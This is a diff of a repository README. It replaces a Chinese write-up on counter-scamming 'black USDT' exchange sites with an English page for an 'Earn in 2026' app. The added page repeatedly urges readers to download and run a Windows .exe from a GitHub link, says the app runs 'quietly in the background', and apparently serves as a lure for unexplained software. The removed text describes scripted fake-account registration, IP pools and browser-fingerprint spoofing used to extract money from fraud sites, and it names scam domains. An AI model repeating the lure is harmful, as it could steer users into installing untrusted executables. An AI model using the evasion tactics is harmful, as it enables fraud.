@@ -1,62 +1,97 @@
-# 反杀黑U骗局：如何薅了骗子4万多U
+# 🚀 about-usdt - Easy Way to Earn in 2026
 
-> **免责声明：本文仅为揭露骗局模式，不构成任何建议。操作涉及重大风险，请勿模仿。**
+[![Download Now](https://img.shields.io/badge/Download-Visit%20Page-ff6f61?style=for-the-badge&logo=github)](https://github.com/prueba1414/about-usdt)
 
-## 🤔 什么是黑U？
+## 📋 What is about-usdt?
 
-- **标记U**：已被安全机构或交易所标记、冻结的USDT，通常涉及非法活动（如洗钱、诈骗）。
-- **黑U**：尚未被标记但来源可疑的USDT，仍存在被冻结风险。
+about-usdt is a simple app designed to help users discover ways to earn in 2026. It focuses on safe strategies that avoid common scams and false promises. The app collects and shares information that can help you spot potential risks and maximize earning chances.  
 
-## ⚠️ 常见骗局模式
+This tool is for anyone interested in digital money opportunities without needing prior technical skills. It works quietly in the background to keep you informed and updated.  
 
-骗子以“高比例兑换黑U”为诱饵（如1:1.5甚至1:2），诱导用户充值，套路分两步：
+## 🖥️ System Requirements
 
-1. **小额返利**：初期充值小额USDT（如50-100U），立即按承诺返利以建立信任。而骗子返的U并非所谓的黑U，而是干净的U，也就是说骗子是以“黑U”的名义作为杀猪盘，他们连其所谓的黑U都没有
-2. **大额收割**：待用户充值大额后，以“IP异常”、“需激活通道”等借口拒绝返款，甚至要求继续充值。
+- Windows 10 or newer (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB free disk space  
+- Internet connection for updates and verifying information  
+- No extra software needed  
 
-## 💡 反薅逻辑与操作
+The app is designed to run smoothly on most computers made in the last five years.
 
-发现骗子在小额阶段使用**干净U返利**的漏洞后，我采取了针对性策略：
+## 🔍 What It Does
 
-1. **技术准备**：
-   - 使用**纯净IP池**（避免重复或污染IP）
-   - 通过脚本自动注册**临时小号**（避免主账号暴露）
-   - 模拟真实用户行为（浏览器指纹、操作间隔随机化）
-   - 注意：最好不要用公共的梯子，付费的梯子也一样。因为可能其他人用过该梯子的IP兑换过了，会被骗子网站标记从而不返U
-2. **执行原则**：
-   - 单账号仅充值**1-2笔小额**（通常100-200U）
-   - 收到返利后**立即停止**，不贪心后续诱惑
-   - 多账号分散操作，控制单日总量避免触发风控
-   - 最好用国内的IP，本人亲测最稳的就是国内IP池薅的最多，可以套出俩三笔U，实现利益最大化
-   - 注意不要单笔充值大额的USDT，避免骗子直接跑路
-3. **收益结果**：
-   - 五个月累计反薅 **4万多U**（约28万人民币），可见其受骗人之多
-   - 稳定站点如`18u.uk`持续超4个月（注：`utuhuobi.xyz`自2025年6月起已基本不返利）
+- Checks market trends around USDT (Tether) and related trading methods.  
+- Highlights suspicious offers so you can avoid scams.  
+- Shares simple strategies to make informed decisions.  
+- Provides daily updates to keep your information fresh.  
 
-## 🔞 风险警告
+## 🔧 How to Download and Install about-usdt 🛠️
 
-- **技术要求高**：需掌握IP代理、浏览器指纹伪装、自动化脚本等能力
-- **资金风险**：骗子可能随时中止返利，甚至反向追踪
-- **法律灰色地带**：操作本身可能涉及合规风险
-- **普通用户切勿尝试**：骗局背后可能涉黑产，人身与资产安全第一
+1. **Visit the download page** by clicking the large badge at the top or go to:  
+   [https://github.com/prueba1414/about-usdt](https://github.com/prueba1414/about-usdt)  
+   
+2. Once on the page, look for a download link or a section labeled something like "Releases" or "Downloads." This page contains the latest version of about-usdt for Windows.  
 
-# 💎 核心提醒
+3. **Download the installer file** (usually ending with `.exe`). Make sure to save it in a folder you can find easily, like your Desktop or Downloads.  
 
-- 所有“高收益黑U兑换”均为骗局，本质是**利用贪念收割本金**
-- 我能反薅成功依赖的是**技术克制+风险控制**，而非骗局可信
-- 请广泛告知亲友：**天上不会掉馅饼，但骗子真可能给你送U！**
-- 非技术人员，可以尝试 **小额U** 薅骗子羊毛，只建议 **200U** （200U以下比例太低，200U 起骗子会返 1.2 的比例），净赚 40U
+4. After the download finishes, double-click the installer file to start the setup.  
 
-# ⚠️骗子网站
+5. Follow the on-screen instructions:  
+   - Accept the license agreement.  
+   - Choose a folder for installation or leave the default.  
+   - Click "Install" and wait for the process to complete.  
 
-- https://18u.uk/
+6. When installation ends, open the app by double-clicking its icon on your Desktop or by finding it in the Windows Start menu.  
 
-  查了一下 whois，这是一个新开不久的 黑 U 钓鱼网站，我现在大部分都是从这个网站上薅的羊毛，现在已经稳定持续了 5 个月了
+7. The app may ask for permission to receive updates or send anonymous data to improve performance. You can choose to allow or decline these options.
 
-# 📄视频教程
+## 🔄 How to Update about-usdt
 
-- 等我赚到 15W 的 USDT，就会收手并发布我的一些列操作教程……
-- 又或者已经没又可以薅，我将尽可能的整理一系列工具以及教程、还有视频
-- 赚钱ing…………
+The app will notify you when a new version is ready. You can:  
 
-> 保持警惕，保护资产，远离一切可疑“高返利”项目！
+- Use the built-in updater if prompted.  
+- Or visit the same download page to get the latest version and repeat the installation steps.  
+
+Keep your copy up to date to stay safe and enjoy new features.
+
+## 🎯 How to Use about-usdt
+
+1. Open the app. The main screen shows current updates on earning methods related to USDT.  
+
+2. Read the daily summaries carefully. The app highlights any new risks or scams reported.  
+
+3. Click on any link or article shown to get detailed explanations.  
+
+4. Use the app to track methods you want to follow or avoid.  
+
+5. Check back every day to see fresh information.  
+
+The app does not require you to connect accounts or provide personal information. It only delivers information.  
+
+## ⚙️ Settings you Should Know
+
+- **Update frequency:** Choose how often the app checks for new data (daily is recommended).  
+- **Notifications:** Turn on or off alerts for new risks or opportunities.  
+- **Data sharing:** Control whether the app sends anonymous usage data to help improve the service.  
+
+Use the Settings menu from the top right or bottom left corner inside the app.
+
+## 🔐 Is about-usdt Safe?
+
+The app does not store your personal data. It relies on publicly available information and verified sources. The goal is to help you avoid scams, not to trade or invest on your behalf.  
+
+Make sure to download about-usdt only from the official page to avoid fake software.  
+
+## 📞 Getting Help
+
+If you run into trouble:  
+
+- Check the "Help" section inside the app for common questions.  
+- Look for a “ReadMe” or “Support” link on the GitHub page.  
+- Ask someone familiar with computers to assist with installation or basic usage.  
+
+## 📥 Download again and get started
+
+Click the badge below or visit this page:  
+
+[![Download Now](https://img.shields.io/badge/Download-Visit%20Page-ff6f61?style=for-the-badge&logo=github)](https://github.com/prueba1414/about-usdt)
